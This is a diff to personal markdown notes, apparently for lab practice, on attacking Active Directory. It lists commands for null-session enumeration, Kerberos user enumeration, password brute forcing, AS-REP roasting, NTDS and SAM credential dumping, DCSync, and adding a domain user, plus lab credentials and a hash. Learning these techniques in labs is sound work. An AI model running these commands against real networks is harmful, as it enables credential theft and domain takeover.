@@ -9,11 +9,6 @@ https://tryhackme.com/room/persistingad - Subs only (network)
 
 ### finding the dc - in a network
 
-##### from a windows client
- 
- should be easy :D
- add something here
-
 ##### from a linux client on a windows network
 
 If you're on a linux box in a ad network port scan for 88 to find the dc (not for red team)
@@ -31,11 +26,12 @@ normal full nmap scan ([[../../Boxes/TryHackMe/Attacktive Directory (Done)/1 - n
 139+445 smb
 
 389 ldap
+464/tcp   open  kpasswd5?
 636 ldap ssl
 3268 global ldap
 3269 global ldap ssl
 
-5985 rdp
+5985 rdp - winrm
 
 ### hosts file
 
@@ -52,16 +48,23 @@ Examples from [[../../Boxes/TryHackMe/Attacktive Directory (Done)/1 - nmap|1 - n
 Example line in `/etc/hosts`:
 `10.10.200.51    AttacktiveDirectory.spookysec.local spookysec.local ATTACKTIVEDIREC THM-AD`
 
+### add for dns tooooo TODO!
+
+
+
 ### dc time
 
 in the nmap scan we see something like
 `88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-02 21:05:34Z)`
 
 for some things we need a similar time as the dc (within one minute)
+
 ##### syncing time from linux
 
 `sudo rdate -n <ipmachine>`
 
+
+## Getting credentials
 
 ### Listen with responder
 
@@ -80,29 +83,64 @@ start responder so it's there listening in the background
 
 `nxc smb 10.10.10.10`
 `nxc smb 10.10.10.10 -u '' -p ''`
-
 `nxc smb 10.10.10.10 -u 'guest' -p ''`
-`nxc smb 10.10.10.10 -u 'guest' -p '' --shares`
+
+`nxc smb 10.10.10.10 -u '' -p '' --shares`
+
+enum usernames
+`nxc smb 10.10.10.10 -u '' -p '' --rid-brute` (rid is the end of the sid)
+`nxc smb 10.10.10.10 -u '' -p '' --users`
+`nxc ldap 10.10.10.10 -u '' -p '' --groups`
+
+get password policy
+`nxc smb 10.10.10.10 -u '' -p '' --pass-pol`
 
 `smbclient -U '' -N -L //10.10.10.10` (-N = no pass)
+`rpcclient -U '' -N 10.10.10.10`
 
-### User... Enumeration
 
-##### username but no password?
+`ldapsearch -x -H ldap://10.10.10.10 -s base namingContexts` get naming context
+
+without creds or with
+`ldapsearch -x -H ldap://10.10.10.10 -D "" -w '' -b "dc=domain,dc=com" "(objectClass=user)" sAMAccountName description memberof`
+
+`nxc smb 10.10.10.10 -u '' -p '' -M spider_plus` list files on shares
+`nxc smb 10.10.10.10 -u '' -p '' -M spider_plus` downloads too
+
+
+### Found nothing?
+
+`~/tools/kerbrute userenum --dc 10.10.10.10 -d domain.com /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt`
+
+### Data sources
+
+##### Found a share
+
+`smbget -U '' -N --recursive smb://10.10.10.10/myshare` get all files from smb share
+`smbget --user="Guest" --password="" --recursive smb://10.10.10.10/myshare`
+
+`smbclient //10.10.97.172/profiles -U Anonymous`
+
+### Passwords
+
+##### username(s) but no password?
 brute force password
-`nxc smb 10.10.10.10 -u 'username' -p 'password-file'`
+`nxc smb 10.10.10.10 -u usernames.txt -p usernames.txt` (start with usernames ass passwords)
+`nxc smb 10.10.10.10 -u usernames.txt -p rockyoupath`
+
+`hydra -L users.txt -P users.txt ldap2://$TARGET`
 
 ##### Finding user names
 Is there a web page?
 Files on shares (null session)?
 Other ports open, like ftp?
 
-##### [[impacket-GetNPUsers]]
+##### [[Tools/impacket-GetNPUsers]]
 
-`impacket-GetNPUsers spookysec.local/ -usersfile userlist.txt -no-pass -dc-ip 10.10.10.10`
+`impacket-GetNPUsers spookysec.local/ -usersfile usernames.txt -no-pass -dc-ip 10.10.10.10`
 - gives hashcat hash - just sent it as it is to hashcat
 
-##### [[kerbrute]]
+##### [[Tools/kerbrute]]
 
 Enumerating users
 `~/tools/kerbrute userenum -d domain.com --dc 10.10.10.10 usernames.txt` 
@@ -124,15 +162,15 @@ Brute Force with creds pairs in file
 
 ### Escalation - When we own a user
 
-enum usernames
-`nxc smb 10.10.10.10 -u 'sofia' -p 'mypass1' --rid-brute`
-(rid is the end of the sid)
+`nxc smb 10.10.10.10 -u 'username' -p 'password' -M gpp_password` 
 
-get password policy
-`nxc smb 10.10.10.10 -u 'sofia' -p 'mypass1' --pass-pol`
+`nxc smb 10.129.169.79 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341:2b87e7c93a3e8a0ea4a581937016f341 --ntds` 
 
-list files on shares (can download too)
-`nxc smb 10.10.10.10 -u '' -p '' -M spider_plus`
+
+`impacket-GetADUsers cicada.htb/emily.oscars:'Q!3@Lp#M6b*7t*Vt' -dc-ip 10.129.169.79 -all`
+
+user names for password spray:
+`ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.com" -w 'password' -b "dc=domain,dc=com" "(objectClass=user)" sAMAccountName description memberof`
 
 ##### DNS dump
 
@@ -147,21 +185,16 @@ TODO!
 
 
 add stuff on:
-ldapsearch
-impacket-owneredit
-impacket-dacledit
-bloodyAD
+[[Tools/ldapsearch|ldapsearch]]
+[[Tools/impacket-owneredit & -dacledit|impacket-owneredit & -dacledit]]
+[[Tools/bloodyAD|bloodyAD]]
 
-##### [[ldapdomaindump - dump domain info]]
+##### [[Tools/ldapdomaindump - dump domain info]]
 `ldapdomaindump ldap://10.10.10.10 -u 'domain.com\\mynormaluser' -p 'mypassword'`
 - check the description field from users and computers
 - check if some users have logged in - might be honey pots
 
-##### [[Bloodhound]]
-
-clear old data:
-- Go to neo4j at http://localhost:7474
-- In the field containing `neo4j$`, enter `MATCH (n) DETACH DELETE n;`
+##### [[Tools/Bloodhound]]
 
 on windows:
 `Sharphound.exe --CollectionMethods All --Domain domain.com --ExcludeDCs`
@@ -176,11 +209,34 @@ Starting Bloodhound:
 `bloodhound --no-sandbox`
 - opens http://127.0.0.1:8080
 - neo4j available at http://localhost:7474
+clear old data:
+- In the field containing `neo4j$`, enter `MATCH (n) DETACH DELETE n;`
+
+
+###### If we have permissions to add a user to a useable group
+- create user
+  `net use tempuser mypass /add /domain`
+- add to group
+  `net group greatgroup /add tempuser`
+- check
+  `net group greatgroup`
+
+
+### get SAM n stuff
+
+`impacket-reg 'cicada.htb/emily.oscars':'Q!3@Lp#M6b*7t*Vt'@10.129.169.79 backup -o c:\windows\temp` (or a connected share \_letter\_)
+or
+`reg save HKLM\SAM sam.hive`
+`reg save HKLM\SYSTEM system.hive`
+
+dump the creds from SAM
+`impacket-secretsdump -sam sam.hive -system system.hive LOCAL`
 
 ##### [[../09 - Windows Exploration/impacket-secretsdump|impacket-secretsdump]]
 
 when you have local files
 `impacket-secretsdump -sam sam.hive -system system.hive "DC01$":@10.10.232.150`
+
 
 when you have `dcsync` permissions
 `impacket-secretsdump spookysec.local/backup:backup2517860@10.10.229.142 -just-dc`
